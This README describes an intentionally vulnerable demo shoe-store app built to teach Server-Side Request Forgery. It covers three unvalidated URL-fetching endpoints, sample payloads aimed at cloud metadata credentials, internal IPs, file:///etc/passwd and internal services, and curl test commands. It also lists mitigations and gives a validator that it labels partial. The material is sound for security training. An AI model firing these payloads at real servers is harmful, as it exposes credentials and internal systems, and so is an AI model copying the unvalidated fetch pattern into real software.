# SSRF Vulnerability Demonstration - Mr. Bluejays Shoe Store

## ⚠️ WARNING
**This application contains intentional security vulnerabilities for educational and demonstration purposes only. DO NOT deploy to production or expose to the internet.**

## Overview
This application demonstrates Server-Side Request Forgery (SSRF) vulnerabilities in a mock e-commerce shoe store. SSRF allows attackers to make the server perform requests to arbitrary URLs, potentially accessing internal resources, cloud metadata, or other sensitive endpoints.

## Setup Instructions

1. **Install Dependencies**
   ```bash
   npm install
   ```

2. **Start the Vulnerable Server**
   ```bash
   npm start
   # Server runs on http://localhost:3000
   ```

3. **Access the Application**
   - Open `index.html` in a web browser
   - Or navigate to http://localhost:3000 after starting the server

## Vulnerable Endpoints

### 1. Product Image Loader (`/api/product-image`)
- **Location**: Products page → "Load Custom Product Image" section
- **Method**: GET with `url` parameter
- **Vulnerability**: No validation of image URLs allows fetching from any source

### 2. URL Preview (`/api/preview-url`)
- **Location**: About page → "Preview External Catalog" section
- **Method**: POST with `targetUrl` in body
- **Vulnerability**: Fetches and returns content from any URL

### 3. Product Import (`/api/import-product`)
- **Method**: POST with `catalogUrl` in body
- **Vulnerability**: Imports data from arbitrary URLs

## SSRF Attack Examples

### 1. Access Internal Admin Endpoints
```
http://localhost:3000/admin/users
http://localhost:3000/internal/config
```

### 2. Cloud Metadata Service (AWS)
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### 3. Internal Network Scanning
```
http://192.168.1.1:80/
http://10.0.0.1:8080/
http://172.16.0.1:3000/
```

### 4. Local File Access (if supported by the HTTP client)
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
```

### 5. Internal Services
```
http://localhost:6379/ (Redis)
http://localhost:9200/ (Elasticsearch)
http://localhost:5984/ (CouchDB)
```

## How to Test the SSRF Vulnerability

### Via Frontend UI:

1. **Test Internal Admin Access:**
   - Go to the Products page
   - In "Load Custom Product Image" enter: `http://localhost:3000/admin/users`
   - Click "Load Image"
   - Observe error message revealing internal data

2. **Test URL Preview:**
   - Go to the About page
   - In "Preview External Catalog" enter: `http://localhost:3000/internal/config`
   - Click "Preview"
   - See internal configuration exposed

### Via Direct API Calls:

```bash
# Fetch internal admin data
curl "http://localhost:3000/api/product-image?url=http://localhost:3000/admin/users"

# Preview internal config
curl -X POST http://localhost:3000/api/preview-url \
  -H "Content-Type: application/json" \
  -d '{"targetUrl":"http://localhost:3000/internal/config"}'

# Import from internal service
curl -X POST http://localhost:3000/api/import-product \
  -H "Content-Type: application/json" \
  -d '{"catalogUrl":"http://localhost:3000/admin/users"}'
```

## Security Impact

SSRF vulnerabilities can lead to:

1. **Data Exfiltration**: Access to internal APIs, databases, and configuration files
2. **Cloud Metadata Access**: Retrieve AWS/Azure/GCP instance credentials
3. **Internal Network Mapping**: Scan internal network for services
4. **Bypass Security Controls**: Access resources behind firewalls
5. **Denial of Service**: Make requests to slow or resource-intensive endpoints
6. **Remote Code Execution**: In combination with other vulnerabilities

## Mitigation Strategies

To fix SSRF vulnerabilities:

1. **Input Validation**
   - Whitelist allowed domains/protocols
   - Validate URL format and structure
   - Block private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
   - Block loopback addresses (127.0.0.0/8, ::1)
   - Block cloud metadata IPs (169.254.169.254)

2. **Network Segmentation**
   - Use separate networks for different services
   - Implement firewall rules
   - Restrict outbound connections

3. **Use Safe Libraries**
   - Employ libraries with built-in SSRF protection
   - Keep dependencies updated

4. **Implement Authentication**
   - Require authentication for sensitive endpoints
   - Use API keys for external requests

5. **Response Handling**
   - Don't return raw responses to users
   - Strip sensitive headers
   - Limit response sizes

## Example Fix (Partial Mitigation)

```javascript
// Add URL validation
function isUrlSafe(url) {
    const parsed = new URL(url);

    // Only allow HTTPS
    if (parsed.protocol !== 'https:') return false;

    // Block internal IPs
    const hostname = parsed.hostname;
    if (hostname === 'localhost' ||
        hostname === '127.0.0.1' ||
        hostname === '169.254.169.254' ||
        hostname.startsWith('192.168.') ||
        hostname.startsWith('10.') ||
        hostname.startsWith('172.')) {
        return false;
    }

    // Whitelist allowed domains
    const allowedDomains = ['example.com', 'trusted-cdn.com'];
    if (!allowedDomains.some(domain => hostname.endsWith(domain))) {
        return false;
    }

    return true;
}
```

## Educational Resources

- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger SSRF Research](https://portswigger.net/web-security/ssrf)
- [SSRF Bible](https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/)

## Disclaimer

This vulnerable application is designed for:
- Security training and education
- Penetration testing practice
- Security awareness demonstrations
- Vulnerability research

**Never use this code in production environments or expose it to untrusted networks.**

## License

For educational use only. Not for production deployment.